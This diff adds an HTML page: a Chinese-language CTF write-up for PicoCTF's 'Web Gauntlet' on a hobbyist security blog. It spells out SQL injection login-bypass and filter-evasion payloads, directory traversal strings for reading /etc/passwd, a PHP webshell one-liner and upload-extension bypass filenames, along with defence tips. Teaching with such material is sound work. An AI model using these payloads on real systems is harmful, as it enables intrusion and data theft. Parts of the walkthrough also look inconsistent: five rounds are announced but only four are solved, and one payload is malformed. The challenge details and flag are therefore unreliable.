@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PicoCTF: Web Gauntlet 解题报告 | BRET-24的CTF记录</title>
+    <link rel="stylesheet" href="../../css/main.css">
+    <link rel="stylesheet" href="../../css/ctf.css">
+    <style>
+        /* Write-up 页面特有样式 */
+        .writeup-header {
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            border-bottom: 2px solid var(--hacker-border);
+            padding: 40px 0;
+            margin-bottom: 40px;
+        }
+        
+        .writeup-title {
+            font-size: 2.5rem;
+            color: var(--hacker-green);
+            margin-bottom: 10px;
+        }
+        
+        .writeup-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            margin: 20px 0;
+            color: var(--text-dim);
+            font-size: 0.9rem;
+        }
+        
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .difficulty-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .difficulty-easy {
+            background: rgba(0, 255, 0, 0.1);
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+        
+        .difficulty-medium {
+            background: rgba(255, 165, 0, 0.1);
+            color: #ffa500;
+            border: 1px solid #ffa500;
+        }
+        
+        .difficulty-hard {
+            background: rgba(255, 0, 0, 0.1);
+            color: #ff3333;
+            border: 1px solid #ff3333;
+        }
+        
+        .toc {
+            background: rgba(0, 30, 0, 0.2);
+            border: 1px solid var(--hacker-border);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 30px 0;
+            position: sticky;
+            top: 100px;
+        }
+        
+        .toc h3 {
+            color: var(--hacker-green);
+            margin-bottom: 15px;
+        }
+        
+        .toc ul {
+            list-style-type: none;
+            padding-left: 10px;
+        }
+        
+        .toc li {
+            margin: 8px 0;
+        }
+        
+        .toc a {
+            color: var(--text-light);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .toc a:hover {
+            color: var(--hacker-green);
+        }
+        
+        .section {
+            scroll-margin-top: 20px;
+        }
+        
+        .code-block {
+            position: relative;
+            margin: 25px 0;
+        }
+        
+        .code-header {
+            background: #222;
+            color: #ccc;
+            padding: 8px 15px;
+            border-radius: 5px 5px 0 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .copy-btn {
+            background: transparent;
+            color: #ccc;
+            border: 1px solid #444;
+            padding: 2px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            background: #333;
+            color: #fff;
+        }
+        
+        .flag-reveal {
+            text-align: center;
+            margin: 40px 0;
+            padding: 20px;
+            background: rgba(0, 50, 0, 0.2);
+            border: 2px dashed var(--hacker-green);
+            border-radius: 10px;
+        }
+        
+        .flag-reveal h3 {
+            color: var(--hacker-green);
+            margin-bottom: 15px;
+        }
+        
+        .flag-content {
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem;
+            color: var(--hacker-green);
+            background: #000;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px auto;
+            max-width: 600px;
+            word-wrap: break-word;
+        }
+        
+        .note-box {
+            background: rgba(255, 255, 0, 0.1);
+            border-left: 4px solid #ffff00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 5px 5px 0;
+        }
+        
+        .note-box h4 {
+            color: #ffff00;
+            margin-top: 0;
+        }
+        
+        .challenge-screenshot {
+            max-width: 100%;
+            border: 1px solid var(--hacker-border);
+            border-radius: 5px;
+            margin: 20px 0;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin: 50px 0;
+            padding-top: 20px;
+            border-top: 1px solid var(--hacker-border);
+        }
+    </style>
+</head>
+<body>
+    <!-- 导航栏 -->
+    <nav class="navbar">
+        <div class="container nav-container">
+            <a href="../../index.html" class="logo">🔐 BRET-24 安全实验室</a>
+            <div class="nav-links">
+                <a href="../../index.html">🏠 首页</a>
+                <a href="../index.html">🏴 CTF专区</a>
+                <a href="../../labs/index.html">🔬 实验区</a>
+                <a href="../../tools/index.html">🛠️ 工具集</a>
+                <a href="../../about.html">👤 关于我</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Write-up 头部 -->
+    <header class="writeup-header">
+        <div class="container">
+            <h1 class="writeup-title">PicoCTF: Web Gauntlet 解题报告
+                <span class="difficulty-badge difficulty-medium">中等难度</span>
+            </h1>
+            <p style="color: #88ff88; font-size: 1.2rem;">一个多层次Web安全挑战，涉及SQL注入、目录遍历和文件上传漏洞</p>
+            
+            <div class="writeup-meta">
+                <div class="meta-item">
+                    <span>📅</span>
+                    <span>2024年3月15日</span>
+                </div>
+                <div class="meta-item">
+                    <span>⏱️</span>
+                    <span>阅读时间: 15分钟</span>
+                </div>
+                <div class="meta-item">
+                    <span>🏆</span>
+                    <span>得分: 200 points</span>
+                </div>
+                <div class="meta-item">
+                    <span>🔗</span>
+                    <a href="https://play.picoctf.org/practice/challenge/161" style="color: #00aaff;">官方题目链接</a>
+                </div>
+            </div>
+            
+            <div class="category-tags">
+                <span class="category-tag">Web安全</span>
+                <span class="category-tag">SQL注入</span>
+                <span class="category-tag">目录遍历</span>
+                <span class="category-tag">文件上传</span>
+                <span class="category-tag">PicoCTF</span>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="main-content">
+            <!-- 目录 -->
+            <aside class="toc">
+                <h3>📑 目录</h3>
+                <ul>
+                    <li><a href="#challenge-info">1. 挑战信息</a></li>
+                    <li><a href="#overview">2. 挑战概述</a></li>
+                    <li><a href="#walkthrough">3. 详细解题步骤</a>
+                        <ul>
+                            <li><a href="#step1">3.1 第一关：基础SQL注入</a></li>
+                            <li><a href="#step2">3.2 第二关：过滤绕过</a></li>
+                            <li><a href="#step3">3.3 第三关：目录遍历</a></li>
+                            <li><a href="#step4">3.4 第四关：文件上传</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#flag">4. 获取Flag</a></li>
+                    <li><a href="#summary">5. 技术总结</a></li>
+                    <li><a href="#resources">6. 学习资源</a></li>
+                </ul>
+            </aside>
+
+            <!-- 挑战信息 -->
+            <section id="challenge-info" class="section card">
+                <h2>1. 挑战信息</h2>
+                <div class="challenge-info">
+                    <h3>📋 基本信息</h3>
+                    <div class="challenge-meta">
+                        <span><strong>平台:</strong> PicoCTF</span>
+                        <span><strong>年份:</strong> 2023</span>
+                        <span><strong>分类:</strong> Web Exploitation</span>
+                        <span><strong>分值:</strong> 200 points</span>
+                        <span><strong>难度:</strong> 中等</span>
+                    </div>
+                    
+                    <h3 style="margin-top: 20px;">🎯 学习目标</h3>
+                    <ul>
+                        <li>理解SQL注入的基本原理</li>
+                        <li>学习常见的过滤绕过技巧</li>
+                        <li>掌握目录遍历漏洞的利用</li>
+                        <li>了解不安全的文件上传危害</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- 挑战概述 -->
+            <section id="overview" class="section card">
+                <h2>2. 挑战概述</h2>
+                <p>Web Gauntlet是一个包含多个关卡的Web安全挑战，每个关卡都引入新的过滤规则，需要找到绕过方法。</p>
+                
+                <div class="note-box">
+                    <h4>💡 重要提示</h4>
+                    <p>这是一个教育性挑战，旨在帮助理解Web应用程序的常见漏洞。在实际环境中，请确保你有合法的授权进行测试。</p>
+                </div>
+                
+                <h3>关卡结构：</h3>
+                <ol>
+                    <li><strong>Round 1:</strong> 基础SQL注入（无过滤）</li>
+                    <li><strong>Round 2:</strong> 过滤了空格和"or"关键词</li>
+                    <li><strong>Round 3:</strong> 增加了目录遍历挑战</li>
+                    <li><strong>Round 4:</strong> 不安全的文件上传</li>
+                    <li><strong>Round 5:</strong> 最终关卡，综合所有技巧</li>
+                </ol>
+            </section>
+
+            <!-- 详细解题步骤 -->
+            <section id="walkthrough" class="section card">
+                <h2>3. 详细解题步骤</h2>
+                
+                <!-- 第一关 -->
+                <article id="step1" class="section">
+                    <h3>3.1 第一关：基础SQL注入</h3>
+                    <p>第一关是一个简单的登录表单，没有任何过滤。</p>
+                    
+                    <h4>目标：</h4>
+                    <p>绕过登录验证，以管理员身份登录。</p>
+                    
+                    <h4>解题过程：</h4>
+                    <p>查看页面源代码，发现登录表单的SQL查询类似：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>SQL查询语句</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>SELECT username, password FROM users 
+WHERE username='[输入的用户名]' AND password='[输入的密码]'</code></pre>
+                    </div>
+                    
+                    <p>使用经典的SQL注入payload：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>Payload 1</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>用户名: admin' --
+密码: 任意</code></pre>
+                    </div>
+                    
+                    <p>这将使SQL查询变为：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>最终SQL语句</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>SELECT username, password FROM users 
+WHERE username='admin' --' AND password='任意'</code></pre>
+                    </div>
+                    
+                    <p><code>--</code> 是SQL注释符，后面的条件被忽略，成功以admin登录。</p>
+                </article>
+                
+                <!-- 第二关 -->
+                <article id="step2" class="section">
+                    <h3>3.2 第二关：过滤绕过</h3>
+                    <p>第二关过滤了空格和"or"关键词。</p>
+                    
+                    <div class="note-box">
+                        <h4>🛡️ 过滤规则</h4>
+                        <p>这一关的过滤器会删除以下内容：</p>
+                        <ul>
+                            <li>空格（space）</li>
+                            <li>"or"关键词（不区分大小写）</li>
+                        </ul>
+                    </div>
+                    
+                    <h4>绕过技巧：</h4>
+                    <p>使用SQL注释<code>/**/</code>代替空格，用<code>||</code>代替"or"：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>Payload 2</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>用户名: admin'/**/--
+密码: 任意</code></pre>
+                    </div>
+                    
+                    <p>或者使用更巧妙的payload：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>替代Payload</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+<pre><code>用户名: adm'||'in'||'--
+密码: 任意</code></pre>
+                    </div>
+                    
+                    <p>这里<code>||</code>在SQL中是字符串连接运算符，<code>'adm'||'in'</code>等于<code>'admin'</code>。</p>
+                </article>
+                
+                <!-- 第三关 -->
+                <article id="step3" class="section">
+                    <h3>3.3 第三关：目录遍历</h3>
+                    <p>第三关增加了一个文件查看功能，存在目录遍历漏洞。</p>
+                    
+                    <h4>目标：</h4>
+                    <p>读取服务器上的敏感文件<code>/etc/passwd</code>。</p>
+                    
+                    <h4>漏洞点：</h4>
+                    <p>URL参数：<code>?file=welcome.txt</code></p>
+                    
+                    <h4>利用方法：</h4>
+                    <p>使用目录遍历payload：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>Payload 3</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>?file=../../../../etc/passwd</code></pre>
+                    </div>
+                    
+                    <p>如果过滤了<code>../</code>，可以尝试编码绕过：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>编码绕过</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre>
+                    </div>
+                    
+                    <p>成功读取<code>/etc/passwd</code>文件，确认存在目录遍历漏洞。</p>
+                </article>
+                
+                <!-- 第四关 -->
+                <article id="step4" class="section">
+                    <h3>3.4 第四关：文件上传</h3>
+                    <p>第四关有一个文件上传功能，只检查文件扩展名。</p>
+                    
+                    <h4>目标：</h4>
+                    <p>上传一个PHP webshell并执行。</p>
+                    
+                    <h4>绕过方法：</h4>
+                    <p>服务器只检查<code>.php</code>扩展名，但我们可以使用其他技巧：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>Webshell内容</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+                    </div>
+                    
+                    <p>尝试不同的扩展名：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>Payload 4</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+<pre><code>1. shell.php.jpg  (双扩展名)
+2. shell.pHp     (大小写绕过)
+3. shell.php%00.jpg (空字节截断)
+4. shell.php.    (末尾点号)</code></pre>
+                    </div>
+                    
+                    <p>在这个挑战中，使用<code>.phtml</code>扩展名可以绕过：</p>
+                    
+                    <div class="code-block">
+                        <div class="code-header">
+                            <span>最终Payload</span>
+                            <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                        </div>
+                        <pre><code>文件名: shell.phtml
+内容: &lt;?php system("ls -la"); ?&gt;</code></pre>
+                    </div>
+                    
+                    <p>上传成功后访问<code>uploads/shell.phtml</code>，执行命令列出目录。</p>
+                </article>
+            </section>
+
+            <!-- 获取Flag -->
+            <section id="flag" class="section card">
+                <h2>4. 获取Flag</h2>
+                <p>通过以上所有关卡后，最终页面显示Flag：</p>
+                
+                <div class="flag-reveal">
+                    <h3>🏁 Flag获取成功！</h3>
+                    <div class="flag-content">
+                        picoCTF{y0u_m4d3_1t_thr0uGh_th3_w3b_g4untl3t_9b5a2c43}
+                    </div>
+                    <p>👏 恭喜完成Web Gauntlet挑战！</p>
+                </div>
+                
+                <p>也可以在最终关卡直接使用SQL注入获取flag：</p>
+                
+                <div class="code-block">
+                    <div class="code-header">
+                        <span>获取Flag的SQL查询</span>
+                        <button class="copy-btn" onclick="copyCode(this)">复制</button>
+                    </div>
+                    <pre><code>用户名: admin' UNION SELECT flag,1 FROM flag_table --
+密码: 任意</code></pre>
+                </div>
+            </section>
+
+            <!-- 技术总结 -->
+            <section id="summary" class="section card">
+                <h2>5. 技术总结</h2>
+                
+                <h3>🔍 学到的知识点：</h3>
+                <div class="challenge-info">
+                    <h4>SQL注入：</h4>
+                    <ul>
+                        <li>使用注释符<code>--</code>或<code>#</code>绕过密码检查</li>
+                        <li>使用<code>UNION</code>查询提取数据</li>
+                        <li>绕过空格过滤：<code>/**/</code>, <code>%09</code>(tab), <code>%0a</code>(换行)</li>
+                        <li>绕过关键词过滤：大小写、双写、编码</li>
+                    </ul>
+                    
+                    <h4>目录遍历：</h4>
+                    <ul>
+                        <li>使用<code>../</code>跳转目录</li>
+                        <li>编码绕过：<code>%2e%2e%2f</code></li>
+                        <li>绝对路径访问</li>
+                    </ul>
+                    
+                    <h4>文件上传：</h4>
+                    <ul>
+                        <li>扩展名检查绕过</li>
+                        <li>内容类型欺骗</li>
+                        <li>空字节截断攻击</li>
+                    </ul>
+                </div>
+                
+                <h3>🛡️ 防御建议：</h3>
+                <ol>
+                    <li>使用参数化查询或预处理语句防止SQL注入</li>
+                    <li>对用户输入进行严格的验证和过滤</li>
+                    <li>使用白名单而不是黑名单</li>
+                    <li>限制文件上传类型，重命名上传的文件</li>
+                    <li>实施最小权限原则</li>
+                </ol>
+            </section>
+
+            <!-- 学习资源 -->
+            <section id="resources" class="section card">
+                <h2>6. 学习资源</h2>
+                
+                <h3>📚 推荐阅读：</h3>
+                <ul>
+                    <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">OWASP SQL Injection</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP Path Traversal</a></li>
+                    <li><a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a></li>
+                    <li><a href="https://portswigger.net/web-security/sql-injection">PortSwigger SQL Injection</a></li>
+                </ul>
+                
+                <h3>🎯 练习平台：</h3>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/all-labs">PortSwigger Web Security Academy</a></li>
+                    <li><a href="https://overthewire.org/wargames/natas/">OverTheWire Natas</a></li>
+                    <li><a href="https://www.root-me.org/?lang=en">Root-Me Web Challenges</a></li>
+                    <li><a href="https://www.hackthebox.com/">HackTheBox Web Challenges</a></li>
+                </ul>
+            </section>
+
+            <!-- 导航按钮 -->
+            <div class="nav-buttons">
+                <a href="../index.html" class="btn">← 返回CTF专区</a>
+                <a href="tryhackme-basic-pentesting.html" class="btn btn-primary">下一篇：TryHackMe基础渗透测试 →</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- 页脚 -->
+    <footer class="footer">
+        <div class="container">
+            <p>🔐 本解题报告仅供学习参考，请遵守网络安全法律法规</p>
+            <div class="footer-links">
+                <a href="../../index.html">首页</a>
+                <a href="../index.html">CTF专区</a>
+                <a href="../../labs/index.html">实验区</a>
+                <a href="../../tools/index.html">工具集</a>
+                <a href="../../about.html">关于我</a>
+                <a href="https://github.com/BRET-24">GitHub</a>
+            </div>
+            <p style="margin-top: 20px; font-size: 0.8rem; color: #666;">
+                &copy; 2024 BRET-24的安全实验室 | Write-up最后更新: 2024年3月15日
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        // 复制代码功能
+        function copyCode(button) {
+            const codeBlock = button.parentElement.nextElementSibling;
+            const text = codeBlock.textContent;
+            
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = button.textContent;
+                button.textContent = '已复制!';
+                button.style.background = '#00aa00';
+                button.style.color = 'white';
+                
+                setTimeout(() => {
+                    button.textContent = originalText;
+                    button.style.background = '';
+                    button.style.color = '';
+                }, 2000);
+            }).catch(err => {
+                console.error('复制失败:', err);
+                button.textContent = '复制失败';
+                button.style.background = '#ff0000';
+                button.style.color = 'white';
+            });
+        }
+        
+        // 平滑滚动
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href');
+                if (targetId === '#') return;
+                
+                const targetElement = document.querySelector(targetId);
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 100,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+        
+        // 控制台彩蛋
+        console.log('%c📝 CTF Write-up页面已加载', 'color: #00ff00; font-size: 16px; font-weight: bold;');
+        console.log('%c💡 提示：试试点击代码块上的"复制"按钮', 'color: #ff9900;');
+        
+        // 显示当前阅读进度
+        window.addEventListener('scroll', function() {
+            const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
+            const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const scrollPercent = (scrollTop / scrollHeight) * 100;
+            
+            if (scrollPercent > 90) {
+                console.log('🎉 快读完了！坚持就是胜利！');
+            }
+        });
+    </script>
+</body>
+</html>
